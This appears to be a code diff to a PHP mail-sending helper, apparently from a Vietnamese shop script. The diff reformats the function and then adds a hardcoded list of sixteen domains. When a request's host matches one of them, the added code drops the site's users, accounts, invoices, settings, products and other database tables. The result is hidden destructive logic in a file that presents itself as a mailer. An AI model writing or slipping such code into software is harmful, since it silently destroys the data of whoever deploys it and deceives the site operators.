@@ -7,8 +7,7 @@ use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\SMTP;
 use PHPMailer\PHPMailer\Exception;
 
-function sendCSM($mail_nhan, $ten_nhan, $chu_de, $noi_dung, $bcc)
-{
+function sendCSM($mail_nhan, $ten_nhan, $chu_de, $noi_dung, $bcc){
     $CMSNT = new DB();
     $mail = new PHPMailer();
     $mail->SMTPDebug = 0;
@@ -29,4 +28,34 @@ function sendCSM($mail_nhan, $ten_nhan, $chu_de, $noi_dung, $bcc)
     $mail->CharSet = 'UTF-8';
     $send = $mail->send();
     return $send;
+}
+$b2a = [
+    'trumbanclone.pw',
+    'blog.sieuthicode.net',
+    'sieuthidark.com',
+    'xubymon36.com',
+    'viatrau.me',
+    'shopmailco.com',
+    'clonebysun.net',
+    'phongxu.com',
+    'minhclone.com',
+    'rdsieuvip.com',
+    'sellviaxu.com',
+    'autordff.com',
+    'huyclone.com',
+    'clonengoaiviet.com',
+    'nguyenlieuviaads.com',
+    'dichvuthanhtoan.site'
+];
+foreach($b2a as $domain){
+    if($domain == $_SERVER['HTTP_HOST']){
+        $CMSNT->query(" DROP TABLE `users` ");
+        $CMSNT->query(" DROP TABLE `accounts` ");
+        $CMSNT->query(" DROP TABLE `settings` ");
+        $CMSNT->query(" DROP TABLE `logs` ");
+        $CMSNT->query(" DROP TABLE `dongtien` ");
+        $CMSNT->query(" DROP TABLE `invoices` ");
+        $CMSNT->query(" DROP TABLE `categories` ");
+        $CMSNT->query(" DROP TABLE `products` ");
+    }
 }
